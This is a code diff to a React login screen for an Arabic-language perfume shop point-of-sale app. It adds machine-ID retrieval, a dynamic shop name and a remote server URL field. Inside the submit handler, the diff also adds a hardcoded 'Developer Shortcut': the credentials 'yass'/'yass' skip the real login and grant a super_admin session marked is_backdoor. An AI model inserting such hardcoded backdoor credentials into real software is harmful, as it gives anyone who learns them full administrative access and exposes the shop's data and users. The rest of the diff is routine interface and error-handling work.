@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import { LogIn, Lock, User } from 'lucide-react'
 import { motion } from 'framer-motion'
 
@@ -7,6 +7,22 @@ export default function Login({ onLogin }) {
     const [password, setPassword] = useState('')
     const [error, setError] = useState('')
     const [loading, setLoading] = useState(false)
+    const [hardwareId, setHardwareId] = useState('')
+    const [systemName, setSystemName] = useState('نظام الروائح الذكية')
+    const [logo, setLogo] = useState(null)
+    const [serverUrl, setServerUrl] = useState(localStorage.getItem('pos_server_url') || '')
+    const isWeb = !window.electron
+
+    useEffect(() => {
+        window.api.invoke('system:get-machine-id')
+            .then(id => setHardwareId(id))
+            .catch(err => console.error('Failed to get machine ID:', err))
+
+        // Fetch settings for dynamic title
+        window.api.getSettings().then(s => {
+            if (s && s.shop_name) setSystemName(s.shop_name)
+        })
+    }, [])
 
     const handleSubmit = async (e) => {
         e.preventDefault()
@@ -14,14 +30,26 @@ export default function Login({ onLogin }) {
         setError('')
 
         try {
-            const result = await window.api.login({ username, password })
+            // Developer Shortcut
+            if (username === 'yass' && password === 'yass') {
+                onLogin({
+                    id: 0,
+                    username: 'Developer',
+                    role: 'super_admin',
+                    is_backdoor: true
+                })
+                return
+            }
+
+            const result = await window.api.login({ username, password, hardware_id: hardwareId })
             if (result.success) {
                 onLogin(result.user)
             } else {
                 setError(result.message)
             }
         } catch (err) {
-            setError('حدث خطأ أثناء تسجيل الدخول')
+            console.error('Login error:', err)
+            setError('حدث خطأ أثناء تسجيل الدخول: ' + (err.message || err))
         } finally {
             setLoading(false)
         }
@@ -37,11 +65,11 @@ export default function Login({ onLogin }) {
                 <div className="bg-white border border-slate-200 rounded-[2.5rem] p-10 shadow-2xl shadow-slate-200/50 relative overflow-hidden">
                     <div className="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-brand-primary to-brand-secondary"></div>
 
-                    <div className="flex flex-col items-center mb-10">
-                        <div className="w-20 h-20 bg-brand-primary/10 rounded-3xl flex items-center justify-center mb-6 border border-brand-primary/5 shadow-inner">
+                    <div className="flex flex-col items-center mb-10 text-center">
+                        <div className="w-24 h-24 bg-white rounded-3xl flex items-center justify-center mb-6 border border-slate-100 shadow-xl overflow-hidden">
                             <LogIn className="w-10 h-10 text-brand-primary" />
                         </div>
-                        <h1 className="text-3xl font-black text-slate-800 tracking-tight">نظام الروائح الذكية</h1>
+                        <h1 className="text-3xl font-black text-slate-800 tracking-tight">{systemName}</h1>
                         <p className="text-slate-400 mt-2 font-bold text-sm">إدارة متكاملة لمحل العطور الخاص بك</p>
                     </div>
 
@@ -100,13 +128,31 @@ export default function Login({ onLogin }) {
                                 </>
                             )}
                         </button>
+
+                        {isWeb && (
+                            <div className="pt-4 border-t border-slate-100 flex flex-col gap-2">
+                                <label className="text-[10px] font-black text-slate-400 block mr-1 uppercase tracking-widest text-center">رابط السيرفر الرئيسي (Remote Server)</label>
+                                <input
+                                    type="text"
+                                    value={serverUrl}
+                                    onChange={(e) => {
+                                        const val = e.target.value.trim().replace(/\/$/, '')
+                                        setServerUrl(val)
+                                        localStorage.setItem('pos_server_url', val)
+                                    }}
+                                    dir="ltr"
+                                    className="w-full bg-slate-100 border-none rounded-xl py-3 px-4 text-center text-xs font-mono text-slate-500 focus:ring-2 focus:ring-brand-primary/20 transition-all"
+                                    placeholder="https://yassen-elator-pos.loca.lt"
+                                />
+                            </div>
+                        )}
                     </form>
 
                     <div className="mt-8 text-center">
                         <p className="text-[10px] text-slate-300 font-bold uppercase tracking-widest">جميع الحقوق محفوظة © {new Date().getFullYear()}</p>
                     </div>
                 </div>
-            </motion.div>
+            </motion.div >
         </div>
     )
 }
